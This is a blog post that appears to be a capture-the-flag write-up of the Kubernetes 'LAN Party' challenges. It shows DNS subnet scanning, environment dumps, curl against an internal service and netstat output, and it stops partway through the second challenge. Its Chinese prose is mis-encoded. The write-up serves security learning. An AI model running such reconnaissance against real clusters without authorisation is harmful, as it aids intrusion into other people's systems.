<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Backgroundåœ°å€https:&#x2F;&#x2F;k8slanparty.com&#x2F; æ—¶é—´March 20, 2024 6:30 PM - March 22, 2024 10:30 PM Challenge 1ï¼šRECONé¢˜ç›®æè¿° As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag.">
<meta property="og:type" content="article">
<meta property="og:title" content="K8S_LAN_PARTY_WriteUp">
<meta property="og:url" content="http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/index.html">
<meta property="og:site_name" content="psych&#39;s blog">
<meta property="og:description" content="Backgroundåœ°å€https:&#x2F;&#x2F;k8slanparty.com&#x2F; æ—¶é—´March 20, 2024 6:30 PM - March 22, 2024 10:30 PM Challenge 1ï¼šRECONé¢˜ç›®æè¿° As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-03-22T16:01:35.000Z">
<meta property="article:modified_time" content="2024-03-22T16:06:58.696Z">
<meta property="article:author" content="psych">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="k8s">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>K8S_LAN_PARTY_WriteUp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Article</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/22/%E6%98%93%E5%AD%A6%E5%AF%BC%E8%A8%80%E5%8F%8A%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&text=K8S_LAN_PARTY_WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&is_video=false&description=K8S_LAN_PARTY_WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=K8S_LAN_PARTY_WriteUp&body=Check out this article: http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&name=K8S_LAN_PARTY_WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&t=K8S_LAN_PARTY_WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4"><span class="toc-number">1.2.</span> <span class="toc-text">æ—¶é—´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-1%EF%BC%9ARECON"><span class="toc-number">2.</span> <span class="toc-text">Challenge 1ï¼šRECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">é™„å½•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-2%EF%BC%9AFINDING-NEIGHBOURS"><span class="toc-number">3.</span> <span class="toc-text">Challenge 2ï¼šFINDING NEIGHBOURS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">3.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-3%EF%BC%9ADATA-LEAKAGE"><span class="toc-number">4.</span> <span class="toc-text">Challenge 3ï¼šDATA LEAKAGE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">4.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.</span> <span class="toc-text">åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nfs-cat-%E5%92%8C-nfs-ls"><span class="toc-number">4.3.1.</span> <span class="toc-text">nfs-cat å’Œ nfs-ls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NFS"><span class="toc-number">4.3.2.</span> <span class="toc-text">NFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-mount"><span class="toc-number">4.3.3.</span> <span class="toc-text">æŸ¥çœ‹ mount</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-flag"><span class="toc-number">4.3.4.</span> <span class="toc-text">å‘ç° flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-4%EF%BC%9ABYPASSING-BOUNDARIES"><span class="toc-number">5.</span> <span class="toc-text">Challenge 4ï¼šBYPASSING BOUNDARIES</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-3"><span class="toc-number">5.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">5.3.</span> <span class="toc-text">åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lstio"><span class="toc-number">5.3.1.</span> <span class="toc-text">lstio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iptabl"><span class="toc-number">5.3.2.</span> <span class="toc-text">iptabl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.3.</span> <span class="toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hint-%E5%88%86%E6%9E%90"><span class="toc-number">5.3.4.</span> <span class="toc-text">hint åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.5.</span> <span class="toc-text">éªŒè¯</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-5%EF%BC%9ALATERAL-MOVEMENT"><span class="toc-number">6.</span> <span class="toc-text">challenge 5ï¼šLATERAL MOVEMENT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">6.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Who-will-guard-the-guardians"><span class="toc-number">6.1.1.</span> <span class="toc-text">Who will guard the guardians?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hint"><span class="toc-number">6.1.2.</span> <span class="toc-text">Hint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy"><span class="toc-number">6.1.3.</span> <span class="toc-text">Policy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-4"><span class="toc-number">7.</span> <span class="toc-text">è€ƒç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">7.1.</span> <span class="toc-text">åˆ†æ</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        K8S_LAN_PARTY_WriteUp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">psych</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-22T16:01:35.000Z" class="dt-published" itemprop="datePublished">2024-03-23</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/">äº‘åŸç”Ÿ</a> â€º <a class="category-link" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/">å®¹å™¨å®‰å…¨</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/k8s/" rel="tag">k8s</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h3><p><a target="_blank" rel="noopener" href="https://k8slanparty.com/">https://k8slanparty.com/</a></p>
<h3 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h3><p>March 20, 2024 6:30 PM - March 22, 2024 10:30 PM</p>
<h2 id="Challenge-1ï¼šRECON"><a href="#Challenge-1ï¼šRECON" class="headerlink" title="Challenge 1ï¼šRECON"></a>Challenge 1ï¼šRECON</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>As a warmup, utilize <a target="_blank" rel="noopener" href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have â€œloaded your machine with dnscan to ease this process for further challenges.</p>
</blockquote>
<h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul>
<li>DNScan</li>
<li>service to ip</li>
<li>curl</li>
</ul>
<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol>
<li>ç‚¹è¿› DNS scanning çš„é“¾æ¥ï¼Œæ˜ å…¥çœ¼å¸˜ï¼š</li>
</ol>
<blockquote>
<p>We actually have access to a Kubernetes specific way to identify live services and sometimes pods in the form of the Kubernetes DNS service.</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡ DNS æ¥æ¢æµ‹æœåŠ¡ã€‚</p>
<p>Service è¢«åˆ†é…ä¸€ä¸ªé›†ç¾¤å†…å¯è®¿é—®çš„ IP(Cluster IP) åœ°å€ï¼Œç”¨äºåœ¨é›†ç¾¤å†…éƒ¨å°†æµé‡è·¯ç”±åˆ°å¯¹åº” Podï¼ŒåŒæ—¶æš´éœ²ç«¯å£åˆ°å…¬ç½‘ã€‚ä¸ Service å…³è”çš„ DNS è®°å½•å…è®¸é€šè¿‡ Service çš„åç§°æ¥è®¿é—® Serviceã€‚è¿™äº› DNS è®°å½•ç”± DNS è§£æå™¨ç®¡ç†ã€‚</p>
<blockquote>
<p>Pod å’Œ Service çš„ DNS åç§°ä¼šè‡ªåŠ¨ç”Ÿæˆå¦‚ä¸‹ï¼š</p>
<ul>
<li>Podï¼špod-ip-address.pod-namespace-name.pod.cluster-domain.exampleï¼ˆä¾‹å¦‚ 10.244.0.1.my-app.svc.cluster.localï¼‰</li>
<li>Serviceï¼šservice-name.service-namespace-name.svc.cluster-domain.exampleï¼ˆä¾‹å¦‚ database.my-app.svc.cluster.localï¼‰</li>
</ul>
</blockquote>
<ol start="2">
<li>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ€è·¯æ˜¯ç”¨ DNScanï¼Œé€šè¿‡ç¯å¢ƒå˜é‡é‡Œçš„ HOST_SERVER IPæ¥åæŸ¥å¯¹åº”çš„ Serviceã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span> | grep HOST</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -h</span><br><span class="line">Usage of dnscan:</span><br><span class="line">  -subnet string</span><br><span class="line">        Input to scan, CIDR notation (e.g., 10.5.0.0/24) or wildcard (e.g., 10.5.0.*)</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">34967 / 65536 [-------------------------------------------------------------------------&gt;________________________________________________________________] 53.36% 988 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65415 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------&gt;] 99.82% 988 p/s10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65536 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------] 100.00% 991 p/s</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ° serviceï¼š<code>getflag-service.k8s-lan-party.svc.cluster.local.</code></p>
<ol start="3">
<li>æƒ³äº†ä¸€ä¸‹æ²¡æƒ³åˆ°åç»­åˆ©ç”¨ï¼Œæƒ³åˆ°ç¯å¢ƒå˜é‡é‡Œé¢ç”±å¼€443ç«¯å£ã€‚ç›´æ¥è®¿é—®è¯¥ IPï¼Œä¹Ÿå°±æ˜¯ service åç§° getflag</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span></span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">USER_ID=063cd108-777e-421c-8c5b-ef053f624672</span><br><span class="line">HISTSIZE=2048</span><br><span class="line">PWD=/home/player</span><br><span class="line">HOME=/home/player</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443</span><br><span class="line">HISTFILE=/home/player/.bash_history</span><br><span class="line">TMPDIR=/tmp</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHLVL=1</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">KUBERNETES_PORT=tcp://10.100.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">HISTFILESIZE=2048</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‡èƒ½ curl </span></span><br><span class="line">player@wiz-k8s-lan-party:~$ curl getflag-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;between-thousands-of-ips-you-found-your-northen-star&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247484222&idx=1&sn=5a1b2d72398280542e75c5310c6b1d19&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&amp;mid=2247484222&amp;idx=1&amp;sn=5a1b2d72398280542e75c5310c6b1d19&amp;scene=21#wechat_redirect</a></p>
<h2 id="Challenge-2ï¼šFINDING-NEIGHBOURS"><a href="#Challenge-2ï¼šFINDING-NEIGHBOURS" class="headerlink" title="Challenge 2ï¼šFINDING NEIGHBOURS"></a>Challenge 2ï¼šFINDING NEIGHBOURS</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</p>
</blockquote>
<h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul>
<li>sidecars(network)</li>
<li>netstat</li>
<li>tcpdump</li>
</ul>
<h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol>
<li>å…ˆç‚¹å¼€ sidecars çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿</li>
</ol>
<blockquote>
<p><strong>Sidecar containers</strong> are the secondary containers that run along with the main application container within the same Pod These containers are used to enhance or to extend the functionality of the main application container by providing additional services, or functionality such as logging, monitoring, security, or data synchronization, without directly altering the primary application code.</p>
</blockquote>
<p>ç›¸å½“äºä¸€ä¸ªé™„å±å®¹å™¨ï¼Œæä¾›é™„åŠ ã€æ‰©å±•åŠŸèƒ½</p>
<blockquote>
<p>If an init container is created with its<code>restartPolicy</code>set to<code>Always</code>, it willstart and remain running during the entire life of the Pod. This can be helpful for running supporting services separated from the main application containers.</p>
</blockquote>
<p>é…ç½® <code>restartpolicy=Always</code> å ï¼Œå°±ä¼šé»˜è®¤å¯åŠ¨ sidecar çš„åŠŸèƒ½å¹¶ä¸€ç›´è¿è¡Œ.</p>
<ol start="2">
<li>Hint 1</li>
</ol>
<blockquote>
<p>Sidecar containers share the same lifecycle, resources, and network namespace with the primary container This co-location allows them to interact closely and share resources.</p>
</blockquote>
<p>å…±ç”¨ç›¸åŒçš„ network å’Œå­˜å‚¨å‘½åç©ºé—´ã€‚</p>
<ol start="3">
<li>ä¿¡æ¯æœé›†</li>
</ol>
<ul>
<li>service</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">65395 / 65536 [-&gt;] 99.78% 988 p/s10.100.171.123 -&gt; reporting-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>

<ul>
<li>network</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ipip 0.0.0.0 brd 0.0.0.0</span><br><span class="line">2113: ns-252e81@if2114: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 06:27:94:7c:7d:aa brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.8.215/31 scope global ns-252e81</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::427:94ff:fe7c:7daa/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<ul>
<li>netstat</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ netstat -ano </span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 192.168.8.215:45366     10.100.171.123:80       TIME_WAIT   timewait (30.31/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34758     10.100.171.123:80       TIME_WAIT   timewait (50.36/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39366     10.100.171.123:80       TIME_WAIT   timewait (40.44/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36266     10.100.171.123:80       TIME_WAIT   timewait (20.28/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43638     10.100.171.123:80       TIME_WAIT   timewait (15.27/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34772     10.100.171.123:80       TIME_WAIT   timewait (50.46/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:45368     10.100.171.123:80       TIME_WAIT   timewait (35.33/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34786     10.100.171.123:80       TIME_WAIT   timewait (55.48/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34780     10.100.171.123:80       TIME_WAIT   timewait (55.38/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39376     10.100.171.123:80       TIME_WAIT   timewait (45.45/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42832     10.100.171.123:80       TIME_WAIT   timewait (5.24/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39370     10.100.171.123:80       TIME_WAIT   timewait (45.35/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42820     10.100.171.123:80       TIME_WAIT   timewait (0.23/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36274     10.100.171.123:80       TIME_WAIT   timewait (25.30/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39362     10.100.171.123:80       TIME_WAIT   timewait (40.34/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43626     